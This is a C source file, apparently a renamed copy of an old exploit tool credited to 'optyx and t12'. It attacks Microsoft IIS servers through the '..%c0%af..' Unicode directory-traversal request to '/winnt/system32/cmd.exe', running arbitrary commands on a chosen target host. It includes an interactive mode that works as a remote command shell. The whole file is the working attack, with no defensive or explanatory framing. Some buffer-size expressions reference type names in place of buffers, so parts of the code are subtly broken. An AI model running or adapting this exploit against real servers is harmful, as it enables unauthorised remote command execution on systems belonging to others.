
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int s_addr ;
typedef int request ;
typedef int host ;
typedef int cmd ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (int) ;
 int FUNC_1 (char*) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,struct sockaddr*,int) ;
 int FUNC_4 (int) ;
 int * FUNC_5 (char*,int,int ) ;
 int FUNC_6 (int ,char*,...) ;
 struct hostent* FUNC_7 (char*) ;
 int FUNC_8 (int) ;
 int FUNC_9 (char*,char*,int) ;
 int FUNC_10 (char*,...) ;
 scalar_t__ FUNC_11 (int,char*,int,int ) ;
 int FUNC_12 (int,char*,int,int ) ;
 int FUNC_13 (int ,int ,int ) ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_14 (char*,char*) ;
 int FUNC_15 (char*) ;
 int FUNC_16 (char*,char*,int) ;
 int FUNC_17 (char*,char*,int) ;
 int FUNC_18 () ;

int FUNC_19(int VAR_5, char **VAR_6)
{
 int VAR_7, VAR_8;
 int VAR_9=80;
 int VAR_10=3;
 int VAR_11=0;
 char VAR_12[1];
 char VAR_13[512]="";
 char VAR_14[1024]="";
 char VAR_15[8192]="GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+";
 struct hostent *VAR_16;
 struct sockaddr_in VAR_17;

 FUNC_10("iis-zank_bread_chafer_8000_super_alpha_hyper_pickle.c\n");
 FUNC_10("by optyx and t12\n");

 for(VAR_7=0;VAR_7<VAR_5;VAR_7++)
 { if(VAR_6[VAR_7][0] == '-') {
   for(VAR_8=1;VAR_8<FUNC_15(VAR_6[VAR_7]);VAR_8++)
    {
    switch(VAR_6[VAR_7][VAR_8])
     {
     case 't':
      FUNC_17(VAR_13, VAR_6[VAR_7+1], sizeof(VAR_13));
      break;
     case 'c':
      FUNC_17(VAR_14, VAR_6[VAR_7+1], sizeof(VAR_14));
      break;
     case 'h':
      FUNC_18();
       break;
     case 'o':
     VAR_10=FUNC_1(VAR_6[VAR_7+1]);
      break;
     case 'p':
      VAR_9=FUNC_1(VAR_6[VAR_7+1]);
      break;
     case 'i':
      VAR_11=1;
      break;
     default:
     break;
    }
   }
  }
 }

 if(!FUNC_14(VAR_13, ""))
 {
  FUNC_6(VAR_3, "specify target host\n");
  FUNC_18();
 }

 if(!FUNC_14(VAR_14, "") && !VAR_11)
 {
  FUNC_6(VAR_3, "specify command to execute\n");
  FUNC_18();
 }

 FUNC_10("]- Target - %s:%d\n", VAR_13, VAR_9);
 if(!VAR_11)
   FUNC_10("]- Command - %s\n", VAR_14);
 FUNC_10("]- Timeout - %d seconds\n", VAR_10);
 if((VAR_16=FUNC_7(VAR_13)) == ((void*)0))
 {
   FUNC_6(VAR_3, "invalid target\n");
  FUNC_18();
 }

 do
  {

  if(VAR_11)
    {
    VAR_14[0]=0;
    FUNC_10("\nC> ");
    if(FUNC_5(VAR_14, sizeof(VAR_14), VAR_4) == ((void*)0))
       FUNC_6(VAR_3, "gets() error\n");
    VAR_14[FUNC_15(VAR_14)-1]='\0';
    if(!FUNC_14("exit", VAR_14))
       FUNC_4(-1);
   }

   for(VAR_7=0;VAR_7<FUNC_15(VAR_14);VAR_7++)
   {
     if(VAR_14[VAR_7]==' ')
     VAR_14[VAR_7]='+';
   }

  FUNC_17(VAR_15,
     "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+",
     sizeof(VAR_15));
   FUNC_16(VAR_15, VAR_14, sizeof(request) - strlen(request) - 1);
   FUNC_16(VAR_15, "\n", sizeof(request) - strlen(request) - 1);

   VAR_17.sin_family = VAR_1;
   VAR_17.sin_port = FUNC_8(VAR_9);
   FUNC_9((char *) &VAR_17.sin_addr, (char *) VAR_16->h_addr,
   sizeof(VAR_17.sin_addr));

   if((VAR_7=FUNC_13(VAR_1, VAR_2, VAR_0)) == -1)
   {
     FUNC_6(VAR_3, "cannot create socket\n");
     FUNC_4(-1);
   }

   FUNC_0(VAR_10);
   VAR_8 = FUNC_3(VAR_7, (struct sockaddr *) &VAR_17, sizeof(VAR_17));
   FUNC_0(0);

   if(VAR_8==-1)
   {
     FUNC_6(VAR_3, "cannot connect to %s\n", VAR_13);
     FUNC_4(-1);
     FUNC_2(VAR_7);
   }

  if(!VAR_11)
      FUNC_10("]- Sending request: %s\n", VAR_15);

   FUNC_12(VAR_7, VAR_15, FUNC_15(VAR_15), 0);

  if(!VAR_11)
      FUNC_10("]- Getting results\n");

   while(FUNC_11(VAR_7,VAR_12,1, 0)>0)
   {
            FUNC_0(VAR_10);
     FUNC_10("%c", VAR_12[0]);
            FUNC_0(0);
   }

  }
  while(VAR_11);

  FUNC_2(VAR_7);
  return 0;
}
